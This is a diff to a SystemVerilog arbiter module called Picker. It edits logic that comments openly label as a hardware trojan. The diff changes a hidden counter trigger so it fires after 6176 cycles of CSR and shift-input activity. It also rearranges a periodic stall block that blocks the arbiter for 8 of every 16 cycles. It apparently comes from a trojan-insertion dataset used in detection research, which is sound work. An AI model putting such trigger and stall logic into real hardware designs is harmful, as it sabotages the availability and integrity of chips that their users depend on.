@@ -17,25 +17,27 @@ output
     logic [$clog2(ENTRY_NUM)-1:0] grantPtr[GRANT_NUM],
     logic granted[GRANT_NUM]
 );
+    localparam INDEX_BIT_SIZE = $clog2(ENTRY_NUM);
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=6176)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 18034;
+    localparam int TRIGGER_THRESHOLD = 6176;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (req && |grant) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |shiftIn) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
 
-    localparam INDEX_BIT_SIZE = $clog2(ENTRY_NUM);
+
     
     logic [ENTRY_NUM-1:0] reqTmp;
     
@@ -61,12 +63,9 @@ output
     end
     
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             stall_counter <= '0;
@@ -80,6 +79,7 @@ output
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : Picker
 
